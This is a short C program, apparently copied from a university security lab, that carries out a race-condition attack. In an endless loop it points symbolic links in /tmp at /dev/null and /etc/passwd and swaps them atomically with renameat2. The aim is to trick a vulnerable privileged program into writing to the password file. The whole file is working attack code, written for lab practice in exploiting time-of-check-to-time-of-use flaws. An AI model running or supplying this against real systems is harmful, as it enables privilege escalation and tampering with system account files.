#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>

// copy following program from lab instruction to launch 4.3 Task2.c Attack. 
int main()
{
   unsigned int flags = RENAME_EXCHANGE;
   while(1){

      // first makes two symbolic links /tmp/XYZ and /tmp/ABC, 
   unlink("/tmp/XYZ"); symlink("/dev/null",   "/tmp/XYZ");
   unlink("/tmp/ABC"); symlink("/etc/passwd", "/tmp/ABC");

   // then using the renameat2 system call to atomically switch them
   renameat2(0, "/tmp/XYZ", 0, "/tmp/ABC", flags);

   // This allows us to change what /tmp/XYZ points to without introducing any race condition.
  
   }
   
return 0; }